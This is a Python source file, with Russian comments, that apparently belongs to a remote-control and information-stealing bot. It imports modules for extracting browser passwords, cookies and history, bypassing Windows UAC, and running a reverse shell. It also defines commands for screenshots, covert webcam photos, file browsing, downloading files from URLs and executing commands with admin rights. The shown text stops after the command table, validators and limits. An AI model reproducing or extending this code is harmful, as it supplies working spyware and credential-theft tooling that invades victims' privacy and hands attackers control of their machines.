#!/usr/bin/env python3
"""
Улучшенный обработчик команд с проверками и понятным синтаксисом
Предусматривает все ошибки и действия
"""

import re
import os
import sys
import json
import logging
import subprocess
import tempfile
import shutil
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime
import platform
import urllib.parse
import urllib.request
from pathlib import Path

# Импорты из других модулей
try:
    from system_info import get_system_info
    from advanced_commands import take_screenshot, capture_webcam, get_processes_list, browse_files
    from browser_data import extract_all_browser_data, extract_browser_passwords, extract_browser_cookies, extract_browser_history
    from windows_bypass import apply_windows_bypasses, bypass_uac_command
    from reverse_shell import init_global_shell, get_global_shell, stop_global_shell
except ImportError as e:
    logging.warning(f"Не удалось импортировать модуль: {e}")

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CommandProcessor:
    """Улучшенный обработчик команд с проверками и валидацией."""
    
    def __init__(self):
        """Инициализация обработчика команд."""
        self.supported_commands = {
            # Системные команды
            'system_info': {
                'aliases': ['/system_info', '/info', '/sys'],
                'description': 'Получить системную информацию',
                'syntax': '/system_info',
                'examples': ['/system_info', '/info', '/sys'],
                'category': 'system'
            },
            'screenshot': {
                'aliases': ['/screenshot', '/screen', '/ss'],
                'description': 'Сделать скриншот экрана',
                'syntax': '/screenshot [качество]',
                'examples': ['/screenshot', '/screenshot high', '/screen'],
                'category': 'media'
            },
            'webcam': {
                'aliases': ['/webcam', '/camera', '/photo'],
                'description': 'Сделать фото с веб-камеры',
                'syntax': '/webcam [разрешение]',
                'examples': ['/webcam', '/webcam 1920x1080', '/camera'],
                'category': 'media'
            },
            'processes': {
                'aliases': ['/processes', '/ps', '/tasks'],
                'description': 'Показать список процессов',
                'syntax': '/processes [фильтр]',
                'examples': ['/processes', '/processes chrome', '/ps'],
                'category': 'system'
            },
            'kill_process': {
                'aliases': ['/kill', '/terminate', '/stop'],
                'description': 'Завершить процесс',
                'syntax': '/kill [PID или имя]',
                'examples': ['/kill 1234', '/kill chrome.exe'],
                'category': 'system'
            },
            'browse_files': {
                'aliases': ['/browse_files', '/files', '/ls', '/dir'],
                'description': 'Просмотр файлов и папок',
                'syntax': '/browse_files [путь]',
                'examples': ['/browse_files', '/files C:\\Users', '/ls /home'],
                'category': 'files'
            },
            'download': {
                'aliases': ['/download', '/get', '/fetch'],
                'description': 'Скачать файл с URL',
                'syntax': '/download [URL] [путь]',
                'examples': ['/download https://example.com/file.exe', '/get https://example.com/file.exe C:\\temp'],
                'category': 'network'
            },
            'execute': {
                'aliases': ['/execute', '/run', '/cmd'],
                'description': 'Выполнить команду',
                'syntax': '/execute [команда] [админ]',
                'examples': ['/execute dir', '/run ipconfig', '/cmd whoami admin'],
                'category': 'system'
            },
            'browser_data': {
                'aliases': ['/browser_data', '/browser', '/browsers'],
                'description': 'Извлечь данные браузеров',
                'syntax': '/browser_data [тип] [браузер]',
                'examples': ['/browser_data', '/browser_data passwords', '/browser_data cookies chrome'],
                'category': 'browser'
            },
            'help': {
                'aliases': ['/help', '/h', '/?'],
                'description': 'Показать справку по командам',
                'syntax': '/help [категория]',
                'examples': ['/help', '/help system', '/h browser'],
                'category': 'info'
            },
            'ping': {
                'aliases': ['/ping', '/test'],
                'description': 'Проверить соединение',
                'syntax': '/ping',
                'examples': ['/ping', '/test'],
                'category': 'network'
            }
        }
        
        # Регулярные выражения для валидации
        self.validators = {
            'url': re.compile(r'^https?://[^\s/$.?#].[^\s]*$', re.IGNORECASE),
            'path': re.compile(r'^[a-zA-Z]:\\|^/|^~'),
            'pid': re.compile(r'^\d+$'),
            'ip': re.compile(r'^(\d{1,3}\.){3}\d{1,3}$'),
            'port': re.compile(r'^\d{1,5}$'),
            'resolution': re.compile(r'^\d+x\d+$'),
            'quality': re.compile(r'^(low|medium|high)$', re.IGNORECASE)
        }
        
        # Ограничения
        self.limits = {
            'max_file_size': 100 * 1024 * 1024,  # 100 MB
            'max_path_length': 260,
            'max_command_length': 1000,
            'max_processes': 100,
            'timeout': 30  # секунды
        }
